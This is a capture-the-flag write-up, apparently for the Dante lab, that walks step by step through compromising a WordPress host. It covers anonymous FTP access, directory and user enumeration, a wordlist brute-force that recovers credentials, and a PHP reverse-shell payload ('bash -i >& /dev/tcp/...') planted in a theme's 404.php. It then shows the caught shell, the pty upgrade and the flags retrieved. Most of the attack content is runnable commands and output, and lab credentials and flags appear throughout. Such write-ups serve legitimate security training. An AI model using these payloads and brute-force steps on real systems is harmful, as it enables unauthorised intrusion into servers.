# Enumeration
## FTP Login
```
$ ftp 10.10.110.100
Connected to 10.10.110.100.
220 (vsFTPd 3.0.3)
Name (10.10.110.100:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Apr 14  2021 Transfer
226 Directory send OK.
ftp> 

$ lftp -e "set ftp:passive-mode off; ls; quit" -u anonymous 10.10.110.100
Password: 
drwxr-xr-x    4 0        0            4096 Apr 14  2021 Transfer                                                           
```
```
ftp> cd Transfer/Incoming
250 Directory successfully changed.
ftp> get todo.txt
local: todo.txt remote: todo.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for todo.txt (310 bytes).
100% |*******************************************************************************************************************************|   310      840.92 KiB/s    00:00 ETA
226 Transfer complete.
310 bytes received in 00:00 (1.62 KiB/s)
```
```
$ cat todo.txt                            
- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS                                                                    
```

## Access HTTP
```
$ dirb http://10.10.110.100:65000/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Mar  2 00:07:29 2024
URL_BASE: http://10.10.110.100:65000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          
---- Scanning URL: http://10.10.110.100:65000/ ----
+ http://10.10.110.100:65000/index.html (CODE:200|SIZE:10918)           + http://10.10.110.100:65000/robots.txt (CODE:200|SIZE:110)             + http://10.10.110.100:65000/server-status (CODE:403|SIZE:281)                                                                                  ==> DIRECTORY: http://10.10.110.100:65000/wordpress/           
```
```
$ curl http://10.10.110.100:65000/robots.txt
User-agent: Googlebot
User-agent: AdsBot-Google
Disallow: /wordpress
Disallow: DANTE{Y0u_Cant_G3t_at_m3_br0!}                                          
```

## WP Scan
```
$ wpscan --url http://10.10.110.100:65000/wordpress --enumerate vp -o wpscan.txt
```
```
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2024-01-16T00:00:00.000Z
 | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'
```

## Create Wordlist
**Username**
```
$ wpscan --url http://10.10.110.100:65000/wordpress --enumerate u
```
```
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

**Password**
```
$ cewl -w cewl.txt http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks
```

### BruteForce WP Login
```
$ wpscan --url http://10.10.110.100:65000/wordpress --usernames names.txt --passwords cewl.txt
```
```
[i] Config Backup(s) Identified:

[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp
 | Found By: Direct Access (Aggressive Detection)

[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - james / Toyota                                                                                                                                                  
Trying admin / skills Time: 00:01:05 <============================================================                                      > (790 / 1256) 62.89%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: james, Password: Toyota
```

## Login to Wordpress

| Url   | http://10.10.110.100:65000/wordpress/wp-admin/users.php |
| ----- | ------------------------------------------------------- |
| Creds | james:Toyota                                            |
### Upload Backdoor
1. Open WP Theme Editor: http://10.10.110.100:65000/wordpress/wp-admin/theme-editor.php
2. Select the Twenty Nineteen 404.php: http://10.10.110.100:65000/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
3. Insert: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'"); ?> to the TwentyTwenty 404.php
4. then listening port with `nc -lnvp 9001`
5. `firefox http://10.10.110.100:65000/wordpress/wp-content/themes/twentynineteen/404.php`
```
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.110.100] 44678
bash: cannot set terminal process group (1094): Inappropriate ioctl for device
bash: no job control in this shell
<w/html/wordpress/wp-content/themes/twentynineteen$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Interactive Shell
```
which python3
python3 -c 'import pty;pty.spawn("/bin/sh")'
```
```
$ cd /home
$ ls -la	// james; balthazar
```
```
$ su james
su james
Password: Toyota

james@DANTE-WEB-NIX01:/home$ cat james/flag.txt
cat james/flag.txt
DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}
james@DANTE-WEB-NIX01:/home$ 
```